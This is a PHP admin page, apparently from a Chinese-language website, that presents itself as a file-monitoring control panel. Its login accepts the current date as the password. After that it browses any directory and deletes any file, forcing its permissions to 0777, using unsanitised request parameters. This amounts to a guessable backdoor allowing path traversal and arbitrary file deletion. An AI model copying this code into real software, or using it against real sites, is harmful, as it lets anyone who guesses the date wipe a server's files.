<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title><?=$rootcompanyname?>控制面板</title>
<script type="text/javascript" src="../js/jquery-1.9.0.min.js"></script>
<script type="text/javascript" src="js/back.js"></script>
<style>
body{
	background:#999;
}
body, table, p, div, span, form, input, textarea, select, pre, button,h1,h2,h3,h4 ,a,ul li{ font-size:15px;font-family: "微軟正黑體","Microsoft JhengHei", "PMingLiU", AppleGothic, Dotum, Lucida Grande, Verdana Sans-serif !important; }
.whitelinks{
	border-collapse:collapse;
	border:1px solid #444;
	margin: 10px auto;
}
.whitelinks th{
	color:#fff;
	font-size:15px;
	line-height:24px;
	padding:5px 10px;
	font-weight:bold;
	background:#333;
}

.whitelinks td{
	color:#000;
	font-size:15px;
	line-height:24px;
	padding:5px 10px;
}
.whitelinks td a{
	color:#fff;
	font-size:15px;
}
</style>
</head>
<body>
<div style='padding:30px;text-align:center;font-size:15px;'>
<?
session_start();
require_once 'config/getform.php';
$mycode=date("Y").date("m").date("d");
if($pass==$mycode){
	$_SESSION['pass']=1;
	echo "歡迎管理者登入<BR><BR>";
	echo "[ <a href='?job=view'>請由此進入管理</a> ]<BR><BR>";
}

$dir="../";	//主目路
	// print 'em
	echo "<H2 style='color:#fff;font-size:24px;'>系統檔案監控系統</H2>";
	echo "請勿任意使用及改變,本功能嚴重影響網站正常運作<BR><BR>";
if($_SESSION['pass']==1){
	if($job=="view"){
		if($d){
			startlist($d,$u);
		}else{
			startlist($dir,'');
		}
	}else if($job=="adm"){
		del($file,$u);
		startlist($d,$u);
	}else{
		echo "<BR>請使用正確路徑進入管理<BR><br />";
	}
}else{
	echo "<BR>請使用正確路徑進入管理<BR><br />";
}

// ##################  FUNCTION  ####################
function del($f,$u){
	$temp=$u.$f;
	if(file_exists($temp)){
		chmod($temp, 0777);
		unlink($temp);
		echo $temp."  delete-OK<BR>";
	}else{
		echo "SORRY FILE MISSING--<BR>";
	}
}
function startlist($x,$up){
	if($up){
		$dup=$up.$x;
	}else{
		$dup=$x;
	}
	$dirArray=openmydir($dup);
	echo "[ <a href='?job=view'>回主目錄</a> ]";
	echo "檔案數：".(count($dirArray)-2)."<BR><BR>";
	print("<TABLE border=1 cellpadding=5 cellspacing=3 class=whitelinks width=800>\n");
	print("<TR><TH>檔案名稱</TH><th>檔案類型</th><th>管理</th></TR>\n");
	// loop through the array of files and print them all
	foreach($dirArray as $temp){
		  if (substr($temp, 0, 1) != "."){ // don't list hidden files
			   if(is_dir($dup.$temp)){
					print("<TR><TD><a href='?job=view&d=".$temp."/&u=".$dup."'>".$temp."</a></td>");
					print("<td>");
					print("</td>");
					print("<td></td>");
					print("</TR>\n");
			   }else{
					print("<TR><TD>".$temp."</td>");
					print("<td>");
					print(pathinfo($temp, PATHINFO_EXTENSION));
					print("</td>");
					print("<td><a href='?job=adm&u=".$dup."&file=".$temp."'>");
					print("管理</a></td>");
					print("</TR>\n");
			   }
		  }
	}
	print("</TABLE>\n");
	echo "<BR><BR><BR><BR><BR>";
}
//開啟資料夾
function openmydir($rr){
	$temp=array();
	$myDirectory = opendir($rr);
	while($entryName = readdir($myDirectory)) {
		$temp[] = $entryName;
	}
	closedir($myDirectory);
	return $temp;
}

?>
</div>
</body>
</html>